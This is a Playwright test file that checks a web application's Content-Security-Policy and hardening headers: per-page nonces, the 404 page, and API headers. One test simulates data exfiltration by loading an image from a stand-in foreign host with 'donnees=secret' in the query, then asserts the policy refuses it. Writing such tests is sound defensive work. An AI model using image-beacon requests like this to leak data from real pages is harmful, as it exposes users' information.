// Security headers as a browser receives them (ADR-030): a policy with a
// fresh nonce on every page, the application's own 404 under it, foreign
// images refused, and the API's hardening kept through the web relay.
import { expect, FOREIGN_HOST, test } from './support/fixtures';

function nonceOf(policy: string): string | undefined {
  return /'nonce-([^']+)'/.exec(policy)?.[1];
}

test('every page has a fresh nonce on its policy and its scripts', async ({ page, request }) => {
  const response = await page.goto('/login');
  const policy = response?.headers()['content-security-policy'] ?? '';
  expect(policy).toContain("'strict-dynamic'");
  expect(policy).toContain("frame-ancestors 'none'");
  expect(policy).toContain("img-src 'self' data: blob:");
  expect(policy).not.toContain('unsafe-eval');
  const nonce = nonceOf(policy);
  expect(nonce).toBeTruthy();
  const scripts = await page
    .locator('script')
    .evaluateAll((nodes) => nodes.map((node) => (node as HTMLScriptElement).nonce));
  expect(scripts.length).toBeGreaterThan(0);
  expect(scripts.every((value) => value === nonce)).toBe(true);
  const again = await request.get('/login');
  expect(nonceOf(again.headers()['content-security-policy'] ?? '')).not.toBe(nonce);
});

test('an unknown address gets the application’s page, under the policy', async ({ page }) => {
  const response = await page.goto('/nulle-part');
  expect(response?.status()).toBe(404);
  expect(response?.headers()['content-security-policy']).toContain("'nonce-");
  await expect(page.getByText('Page introuvable')).toBeVisible();
});

test('an image from elsewhere is refused by the policy', async ({ page, violations }) => {
  await page.goto('/login');
  const loaded = await page.evaluate(
    (source) =>
      new Promise<boolean>((resolve) => {
        const image = new Image();
        image.onload = () => resolve(true);
        image.onerror = () => resolve(false);
        image.src = source;
      }),
    `https://${FOREIGN_HOST}/fuite.png?donnees=secret`,
  );
  expect(loaded).toBe(false);
  // Refused by the policy itself, not by the network.
  await expect
    .poll(() => violations.some((v) => v.includes('img-src') && v.includes(FOREIGN_HOST)))
    .toBe(true);
});

test('the API keeps its hardening through the web relay', async ({ request }) => {
  const health = await request.get('/api/health');
  expect(health.ok()).toBe(true);
  const headers = health.headers();
  expect(headers['content-security-policy']).toBe("default-src 'none'; frame-ancestors 'none'");
  expect(headers['x-content-type-options']).toBe('nosniff');
  expect(headers['cache-control']).toBe('no-store');
});
